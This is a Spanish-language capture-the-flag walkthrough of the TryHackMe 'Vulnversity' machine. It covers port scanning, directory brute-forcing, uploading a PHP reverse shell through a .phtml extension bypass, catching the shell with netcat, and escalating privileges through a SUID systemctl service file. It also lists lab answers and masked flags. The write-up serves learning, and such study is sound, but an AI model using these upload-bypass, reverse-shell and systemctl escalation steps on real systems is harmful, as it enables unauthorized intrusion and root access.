---
title: "tryhackme: vulnversity"
share: false
excerpt: "El mejor metodo de aprendizaje es practicando"
share: false
header:
  teaser:  /assets/images/vulnversity/logo.jpeg
  teaser_home_page: true
categories:
  - tryhackme
tags:
  - Nmap
  - Gobuster
  - Burp suite
---

### Iniciamos la fase de reconocimiento

Antes de iniciar, verificamos que la maquina este activa

```bash
❯ ping -c 1 10.10.249.39
PING 10.10.249.39 (10.10.249.39) 56(84) bytes of data.
64 bytes from 10.10.249.39: icmp_seq=1 ttl=63 time=1085 ms

--- 10.10.249.39 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1085.220/1085.220/1085.220/0.000 ms
```

- Enviamos un ping y recivimos una respuesta, esta activa la maquinal

Comprovamos que *OS* tiene la maquia antes de iniciar

```bash
❯ wichSystem.py 10.10.249.39

10.10.249.39 (ttl -> 63): Linux
```


### Reconnaissance 

Iniciamos haciendo un primer escaneo con _nmap_

```bash
>sudo nmap --open -p- --min-rate 5000 -sS -Pn -n 10.10.249.39 -oG allPorts
```

> Scan the box, how many ports are open?
> 6

Vemos que tiene 6 puertos abiertos, ahora a ver que servicios estan corriendo en cada uno

```bash
> extractPorts allPorts
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.249.39
   5   │     [*] Open ports: 21,22,139,445,3128,3333
   6   │ 
   7   │ [*] Ports copied to clipboard
```


> What version of the squid proxy is running on the machine?
> 3128/tcp open  http-proxy  Squid http proxy 3.5.12


```bash
❯ nmap -sV -sC -p21,22,139,445,3128,3333 10.10.249.39 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 01:29 -05
Nmap scan report for 10.10.249.39
Host is up (0.17s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-11-10T01:30:09-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-10T06:30:09
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.84 seconds
```
(Vamos respondiendo las preguntas de la maquina)
> How many ports will nmap scan if the flag -p-400 was used?
> 400

> Using the nmap flag -n what will it not resolve?
> DNS

> What is the most likely operating system this machine is running?
> Ubuntu

> What port is the web server running on?
> 3333 


### Locating directories using GoBuster 

En esta fase utilizaremos Gobuster para ver posibles _urls_ existentes

> What is the directory that has an upload form page?
>  /internal/


```bash
> gobuster dir -u http://10.10.1.188:3333 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

===============================================================
2021/11/10 09:37:40 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/css                  (Status: 301) [Size: 315] [--> http://10.10.1.188:3333/css/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.1.188:3333/fonts/]
/images               (Status: 301) [Size: 318] [--> http://10.10.1.188:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                    
/internal             (Status: 301) [Size: 320] [--> http://10.10.1.188:3333/internal/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.1.188:3333/js/]      
/server-status        (Status: 403) [Size: 301]                                        
                                                                                       
===============================================================
2021/11/10 09:39:13 Finished
===============================================================
```
entramos en la ruta que encontramos con el anterior escaneo _http://10.10.1.188:3333/internal/_ y encontramos que podemos subir
un archivo en la maquina, probaremos obtener una _shell_ mediante php

para ello, modificaremos [esta](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) _shell_ de php

[cargar shell](/assets/images/vulnversity/server.png)

### Compromise the webserver 

En esta parte podemos hacerlo de varios metodos, pero seguiremos la maquina y utilizaremos *burp suite*


> Run this attack, what extension is allowed?
> .phtml

[shell en el servidor](/assets/images/vulnversity/shell.png)

ponemos nuestra maquina en escucha

```bash
❯ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.9.0.237] from (UNKNOWN) [10.10.1.188] 57880
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:55:03 up 39 min,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Estamos dentro de la maquina, ahora a buscar la flag 1


> What is the name of the user who manages the webserver?
> bill

```bash
$ cat user.txt
8xx7x92xbexax6xa22x63x6x00xcfxexb
```

> What is the user flag?
> 8xdx99xxxfexaxadxxa6x36x1x0xcxcxxb

### Privilege Escalation 

la maquina nos da una ayuda, utilidar el comando *find / -user root -perm -4000 -exec ls -ldb {} \;*, sin embargo,
tambien es valido utilizar *find / -perm -u=s -type f 2>/dev/null* 

```bash
$ find / -perm -u=s -type f 2>/dev/null               
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

> On the system, search for all SUID files. What file stands out?
> /bin/systemctl

Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con 
los siguientes comandos.

1. Primero, creamos el archivo para la conexion de shell inversa
1. creamos un servicio y lo ejecutamos con _systemcl_

```bash
$ TF=$(mktemp).service
$ echo '[Service]
> ExecStart=/bin/sh -c "cp /root/root.txt > /tmp/output.txt"
> WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable-now $TF
```
> Become root and get the last flag (/root/root.txt)
>
